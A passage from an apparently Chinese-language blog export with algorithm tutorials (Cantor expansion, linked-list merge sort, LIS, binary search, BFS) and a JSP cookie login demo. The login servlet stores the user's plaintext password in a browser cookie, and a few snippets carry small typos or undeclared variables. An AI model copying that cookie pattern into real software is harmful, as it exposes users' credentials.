class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String username = req.getParameter(<span class="string">"username"</span>).trim();</span><br><span class="line">        String password = req.getParameter(<span class="string">"password"</span>).trim();</span><br><span class="line">        saveCookie(resp, <span class="string">"userCookie"</span>, username + <span class="string">"-&gt;"</span> + password, <span class="number">60</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">this</span>.getServletContext().setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        resp.sendRedirect(<span class="string">"index_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">saveCookie</span><span class="params">(HttpServletResponse response, String cookieName, String value, <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, value);】</span><br><span class="line">        <span class="comment">// 以秒为单位</span></span><br><span class="line">        cookie.setMaxAge(time);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建登陆成功后的页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello $&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"logout_1"</span>&gt;</span> 注销 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建注销<code>Servlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/logout_1"</span>, name = <span class="string">"Logout_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logout_1Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        deleteCookieByName(resp, req, <span class="string">"userCookie"</span>);</span><br><span class="line">        resp.sendRedirect(<span class="string">"login_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 由于没有提供delete方法，可借助 cookie.setMaxAge(0) 将cookie的时间设置成0，即过期状态，间接达到删除目的</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cookieName</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deleteCookieByName</span><span class="params">(HttpServletResponse response, HttpServletRequest request, String cookieName)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, <span class="string">""</span>);</span><br><span class="line">        cookie.setMaxAge(<span class="number">0</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Jsp</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>康托展开C++实现</title>
    <url>/2020/09/13/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80C-%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>康托展开是一个全排列到一个自然数的双射，常用于构建哈希表时的空间压缩。 康托展开的实质是计算当前排列在所有由小到大全排列中的顺序，因此是可逆的。<a id="more"></a></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 康托展开</span></span><br><span class="line"><span class="comment">* num[]: 全排列序列（下标从1开始）</span></span><br><span class="line"><span class="comment">* LEN ：全排列长度 </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cantor</span><span class="params">(<span class="keyword">int</span> num[], LEN)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>,sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; LEN;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt;= LEN;j++)</span><br><span class="line">            <span class="keyword">if</span>(num[j] &lt; num[i])</span><br><span class="line">                sum++;</span><br><span class="line">        ans += sum * factorial[LEN - i];</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 康托逆展开</span></span><br><span class="line"><span class="comment">* index: 全排列索引</span></span><br><span class="line"><span class="comment">* LEN ：全排列长度 </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decantor</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> LEN)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;mySet = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> div, mod, j;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= LEN;i++)&#123;</span><br><span class="line">        div = index / factorial[LEN - i];</span><br><span class="line">        mod = index % factorial[LEN - i];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>,it = mySet.<span class="built_in">begin</span>();j &lt; div;j++)it++;</span><br><span class="line">        num[i] = *it;</span><br><span class="line">        mySet.erase(it);</span><br><span class="line">        index = mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>映射</tag>
        <tag>康托展开</tag>
      </tags>
  </entry>
  <entry>
    <title>非递归方式进行归并排序链表</title>
    <url>/2020/08/24/%E9%9D%9E%E9%80%92%E5%BD%92%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<blockquote>
<p>题目来源：<a href="https://leetcode-cn.com/problems/sort-list/" target="_blank" rel="noopener">LeetCode 148</a></p>
</blockquote>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p>给你一个链表， 在 <code>O(n log n)</code>时间复杂度和常数级空间复杂度下，对链表进行排序。 </p>
<p>啥？把链表排序，把时间复杂度控制在<code>O(nlogn)</code>？，链表不像数组，排序没有那么方便啊！归并排序，常数级空间复杂度？那只能非递归实现了~~</p>
<p>不过我不知道该怎么写，看了评论区，自己整理了一下。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode <span class="title">mergetSort</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">int</span> listLength = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ListNode l = head; l != <span class="keyword">null</span>; l = l.next) listLength++;</span><br><span class="line">    ListNode helperRoot = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    helperRoot.next = head;</span><br><span class="line">    ListNode helper = helperRoot;</span><br><span class="line">    <span class="comment">// 步长， 即每个子区间的长度</span></span><br><span class="line">    <span class="keyword">int</span> step = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (step &lt; listLength) &#123;</span><br><span class="line">        helper = helperRoot;</span><br><span class="line">        <span class="keyword">for</span> (ListNode start = helperRoot.next; start != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">            ListNode end = start, mid = start, pre = start;</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; mid != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = mid;</span><br><span class="line">                mid = mid.next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre.next = <span class="keyword">null</span>;</span><br><span class="line">            end = mid;</span><br><span class="line">            pre = mid;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; end != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = end;</span><br><span class="line">                end = end.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pre != <span class="keyword">null</span>) pre.next = <span class="keyword">null</span>;</span><br><span class="line">            ListNode nextStart = end;</span><br><span class="line">            ListNode[] merger = merger(start, mid);</span><br><span class="line">            helper.next = merger[<span class="number">0</span>];</span><br><span class="line">            merger[<span class="number">1</span>].next = nextStart;</span><br><span class="line">            start = nextStart;</span><br><span class="line">            helper = merger[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        step *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> helperRoot.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回合并后的链表头指针和尾指针</span></span><br><span class="line">ListNode[] merger(ListNode left, ListNode rightStart) &#123;</span><br><span class="line">    ListNode leftStart = left;</span><br><span class="line">    ListNode listTail = left;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span> &amp;&amp; rightStart == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 其实在本题中， 左边链表不会是null</span></span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        listTail = rightStart;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;rightStart, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rightStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;left, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode root = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    ListNode tail = root;</span><br><span class="line">    <span class="keyword">while</span> (rightStart != <span class="keyword">null</span> &amp;&amp; leftStart != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (leftStart.val &lt; rightStart.val) &#123;</span><br><span class="line">            tail.next = leftStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            leftStart = leftStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tail.next = rightStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            rightStart = rightStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        tail.next = rightStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tail.next = leftStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;root.next, listTail&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>链表</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之单调递减栈</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%8D%95%E8%B0%83%E9%80%92%E5%87%8F%E6%A0%88/</url>
    <content><![CDATA[<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> LEN = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = LEN - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.empty() &amp;&amp; nums[i] &gt; stack.peek())&#123;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>单调递减栈</tag>
      </tags>
  </entry>
  <entry>
    <title>最长递增子序列(LIS)</title>
    <url>/2020/08/24/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97-LIS/</url>
    <content><![CDATA[<p>暴力法：将所有的排列组合枚举，计算最长的长度，时间复杂度：<code>O(n!)</code>，<strong>不可行！</strong></p>
<p>法二：将原序列<code>A</code>复制并升序得到<code>A&#39;</code>，求<code>A</code> 和<code>A&#39;</code>最长公共子序列的长度，即为所求，时间复杂度是<code>O(n^2)</code></p>
<p>下面介绍另外的两种方法：<a id="more"></a></p>
<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转移状态： dp[i] = max&#123;0,dp[j]&#125; + 1, 0 &lt; j &lt; i</span></span><br><span class="line"><span class="comment"> * O(n^2)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByDp</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxLen = <span class="number">1</span>, largerLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        largerLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[j] &gt; largerLen &amp;&amp; nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                largerLen = dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i] = largerLen + <span class="number">1</span>;</span><br><span class="line">        maxLen = maxLen &gt; dp[i] ? maxLen : dp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxLen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * O(nlogn)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByD</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    d[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &gt; d[lastIndex]) &#123;</span><br><span class="line">            d[++lastIndex] = nums[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> j = lower_bound(d, <span class="number">0</span>, lastIndex, nums[i]);</span><br><span class="line">            d[j] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lastIndex + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] d, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; d[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>LIS</tag>
      </tags>
  </entry>
  <entry>
    <title>二分查找</title>
    <url>/2020/08/24/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>二分查找应用于在有序数组中寻找满足特定条件的元素，时间复杂度可以降到<code>O(logn)</code>，该算法的必要前提是有序数组必须有序。<a id="more"></a></p>
<h2 id="查找不小于target元素的下标"><a href="#查找不小于target元素的下标" class="headerlink" title="查找不小于target元素的下标"></a>查找不小于target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查找大于target元素的下标"><a href="#查找大于target元素的下标" class="headerlink" title="查找大于target元素的下标"></a>查找大于target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt;= nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查找第一个target元素的下标"><a href="#查找第一个target元素的下标" class="headerlink" title="查找第一个target元素的下标"></a>查找第一个target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exist_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">            end = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mid - <span class="number">1</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid - <span class="number">1</span>] == target) &#123;</span><br><span class="line">                end = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span> || nums[end] != target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>广度优先搜索遍历矩阵</title>
    <url>/2020/08/24/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E9%81%8D%E5%8E%86%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<p>广度优先搜索策略（<code>BFS</code>）应用非常广泛，图遍历，二叉树遍历（实际上也属于图的特殊形式），矩阵遍历等都可以使用，在进行矩阵遍历，例如说逃离迷宫最短时间的算法都可以使用<code>BFS</code>进行实现，当然了使用<code>DFS</code>也可以，但是使用<code>DFS</code>的时候，会产生很多非最优解，性能方面及不上<code>BFS</code>，<code>BFS</code>能够保证第一次找到可行解就是最优解。<a id="more"></a></p>
<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span>[][] map)</span></span>&#123;</span><br><span class="line">	LinkedList&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 记录当前层数节点的大小</span></span><br><span class="line">        nowSize = queue.size();</span><br><span class="line">        <span class="keyword">while</span> (nowSize-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            now = queue.poll();</span><br><span class="line">            <span class="comment">// 根据适当条件加入邻接的的节点</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 层数增加</span></span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之快速排序</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>快速排序属于性能较好的排序算法，能够将平均的时间复杂度趋于<code>O(nlogn)</code>，而空间复杂度为<code>O(1)</code>。<a id="more"></a></p>
